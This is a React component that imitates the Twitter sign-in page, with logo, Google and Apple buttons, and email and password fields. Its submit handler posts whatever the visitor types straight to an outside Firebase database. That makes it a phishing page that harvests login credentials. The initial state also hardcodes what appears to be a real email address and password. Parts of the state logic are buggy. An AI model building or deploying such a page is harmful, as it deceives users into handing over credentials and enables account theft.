import { useState } from "react";
import "./App.css";

function App() {
  let [email, setemail] = useState(["sahildgr18@gmail.com"]);
  let [password, setpassword] = useState(["itwillneverchange"]);

  const sendData = async (e) => {
    e.preventDefault();
    setemail([...email, setemail]);
    setpassword([...password, setpassword]);
    setemail("");
    setpassword("");
    if (email || password) {
      let response = await fetch(
        "https://twitter-b8e5f-default-rtdb.firebaseio.com/twitter.json",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify([email, password]),
        }
      );
    } else {
      alert("Enter your Email id");
    }
  };
  return (
    <div className="app">
      <div className="logo-box">
        <img className="logo" src="./twitter.png" alt="apple logo" />
        <h2>Sign in to Twitter</h2>
        <button>
          <img src="./google.png" alt="apple logo" className="apple" />
          Sign in with Google
        </button>

        <button>
          <img src="./apple.png" alt="apple logo" className="apple" />
          Sign in with apple
        </button>
        <hr />
        <span>or</span>
        <form method="POST">
          <input
            type="text"
            placeholder="phone email or username"
            value={email}
            onChange={(e) => {
              setemail(e.target.value);
            }}
          />

          <input
            type="password"
            placeholder="enter your password"
            value={password}
            onChange={(e) => {
              setpassword(e.target.value);
            }}
          />
          <button onClick={sendData}>Next</button>
        </form>
      </div>
    </div>
  );
}

export default App;
